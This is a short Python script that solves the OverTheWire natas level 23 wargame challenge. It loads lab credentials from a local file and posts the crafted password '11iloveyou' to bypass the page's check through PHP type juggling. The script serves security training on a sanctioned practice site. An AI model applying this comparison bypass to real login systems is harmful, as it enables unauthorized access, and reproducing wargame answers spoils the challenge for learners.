"""
Help script to resolve natas challenge #23
"""
import requests
import json

level = 'natas23'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level the page will play with PHP's type juggling.
"""
response = requests.post(url, data={"passwd": "11iloveyou"}, auth=auth)
print(response.text)
